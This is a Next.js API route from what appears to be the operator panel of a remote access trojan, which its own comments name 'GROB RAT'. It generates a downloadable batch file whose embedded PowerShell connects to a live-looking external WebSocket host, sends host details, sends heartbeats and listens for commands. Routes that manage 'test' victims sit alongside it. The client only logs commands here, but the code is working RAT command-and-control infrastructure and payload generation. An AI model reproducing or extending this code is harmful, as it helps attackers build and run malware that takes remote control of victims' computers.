import { NextResponse } from "next/server"
import * as crypto from "crypto"

// In-memory storage for test users
const testUsers = new Map<string, any>()

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const action = formData.get("action") as string
    const username = formData.get("username") as string

    if (action === "create") {
      // Create test user batch file
      const randomName = crypto.randomBytes(8).toString("hex")
      const testUsername = username || `test_${randomName}`
      const testUid = `test-${randomName}`

      const batchContent = `@echo off
title GROB Test User - ${testUsername}
color 0B
echo.
echo ====================================
echo       GROB TEST USER
echo ====================================
echo.
echo [+] Username: ${testUsername}
echo [+] User ID: ${testUid}
echo [+] Mode: Test (Desktop Only)
echo.

:: Create working directory
if not exist "%TEMP%\\GROB" mkdir "%TEMP%\\GROB"
cd /d "%TEMP%\\GROB"

:: Create test PowerShell client
echo [+] Creating test user...
powershell -Command "& {
    # GROB RAT Test User - Desktop Only
    param(
        [string]$ServerUrl = 'wss://glistening-mindfulness.up.railway.app',
        [string]$UserId = '${testUid}',
        [string]$Username = '${testUsername}'
    )

    Write-Host '[+] Starting GROB Test User...'
    Write-Host '[+] Username:' $Username
    Write-Host '[+] User ID:' $UserId
    Write-Host '[+] Mode: Desktop Only (No Actions)'

    # Show PowerShell window for test user
    $$Host.UI.RawUI.WindowTitle = \\"GROB Test User - $Username\\"

    # Test WebSocket connection
    Write-Host '[+] Testing WebSocket connection...'
    try {
        $$WS = New-Object System.Net.WebSockets.ClientWebSocket
        $$CT = New-Object System.Threading.CancellationTokenSource
        $$Buffer = New-Object byte[] 4096
        
        Write-Host '[+] Connecting to:' $ServerUrl
        $$WS.ConnectAsync($ServerUrl, $$CT.Token).Wait()
        Write-Host '[+] WebSocket connected successfully!'
        
        # Send initial connection with user ID
        $$Auth = @{
            type = 'auth'
            uid = $UserId
            pc_info = @{
                hostname = $Username + '-PC'
                username = $Username
                os = 'Windows 10 Test'
                ip = '127.0.0.1'
                timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                test_user = $$true
            }
        } | ConvertTo-Json -Compress
        
        $$AuthBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Auth)
        $$WS.SendAsync($$AuthBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
        Write-Host '[+] Auth data sent!'
        
        # Listen for commands (but don't execute them - just log)
        while ($$WS.State -eq 'Open') {
            try {
                $$Result = $$WS.ReceiveAsync($$Buffer, $$CT.Token)
                if ($$Result.Result -eq 'Close') { 
                    Write-Host '[+] Connection closed by server'
                    break 
                }
                
                $$Message = [System.Text.Encoding]::UTF8.GetString($$Buffer, 0, $$Result.Count)
                Write-Host '[+] Received message:' $$Message
                
                # Send heartbeat every 30 seconds
                if ($$Message -like '*heartbeat*') {
                    $$Heartbeat = @{
                        type = 'heartbeat'
                        uid = $UserId
                        timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                        test_user = $$true
                    } | ConvertTo-Json -Compress
                    
                    $$HeartbeatBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Heartbeat)
                    $$WS.SendAsync($$HeartbeatBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
                    continue
                }
                
                $$Command = $$Message | ConvertFrom-Json
                Write-Host '[+] Received command:' $$Command.type
                Write-Host '[+] TEST MODE: Command logged but not executed'
                
                # Send response that command was received (but not executed)
                $$Response = @{
                    type = 'command_received'
                    command = $$Command.type
                    executed = $$false
                    test_mode = $$true
                    uid = $UserId
                    message = 'Test user - command logged but not executed'
                } | ConvertTo-Json -Compress
                
                $$ResponseBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Response)
                $$WS.SendAsync($$ResponseBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
                
            } catch {
                Write-Host '[-] Error processing command:' $$_
            }
        }
    } catch {
        Write-Host '[-] WebSocket connection failed:' $$_
    } finally {
        if ($$WS) { 
            Write-Host '[+] Cleaning up WebSocket'
            $$WS.Dispose() 
        }
        if ($$CT) { 
            Write-Host '[+] Cleaning up cancellation token'
            $$CT.Dispose() 
        }
    }
}"

echo.
echo [✓] Test user created!
echo [✓] Username: ${testUsername}
echo [✓] User ID: ${testUid}
echo [✓] Mode: Desktop Only (No Actions)
echo.
echo [+] Press any key to exit...
pause >nul
exit
`

      return new NextResponse(batchContent, {
        headers: {
          "Content-Type": "text/plain",
          "Content-Disposition": `attachment; filename="test_user_${testUsername}.bat"`,
        },
      })

    } else if (action === "instant") {
      // Create instant test user (no file download)
      const randomName = crypto.randomBytes(8).toString("hex")
      const testUsername = username || `test_${randomName}`
      const testUid = `test-${randomName}`

      // Store test user in memory
      const testUser = {
        id: testUid,
        name: testUsername,
        hostname: `${testUsername}-PC`,
        status: "online" as const,
        ip: "127.0.0.1",
        os: "Windows 10 Test",
        lastSeen: new Date().toISOString(),
        hwid: testUid,
        test_user: true,
        created_at: new Date().toISOString()
      }

      testUsers.set(testUid, testUser)

      return NextResponse.json({
        success: true,
        message: "Тестовый пользователь создан мгновенно!",
        test_user: testUser
      })

    } else if (action === "list") {
      // List existing test users
      const usersList = Array.from(testUsers.values())
      
      return NextResponse.json({
        success: true,
        test_users: usersList
      })

    } else if (action === "remove") {
      // Remove test user
      const removeUid = formData.get("uid") as string
      if (removeUid && testUsers.has(removeUid)) {
        testUsers.delete(removeUid)
        return NextResponse.json({
          success: true,
          message: "Тестовый пользователь удалён"
        })
      }
      
      return NextResponse.json({
        success: false,
        message: "Пользователь не найден"
      })

    } else {
      return NextResponse.json({ error: "Invalid action" }, { status: 400 })
    }

  } catch (error: any) {
    console.error("Test users error:", error)
    return NextResponse.json(
      { error: "Failed to create test user", details: error.message },
      { status: 500 }
    )
  }
}

export async function GET() {
  // Return list of test users for polling
  const usersList = Array.from(testUsers.values())
  
  return NextResponse.json({
    success: true,
    test_users: usersList
  })
}
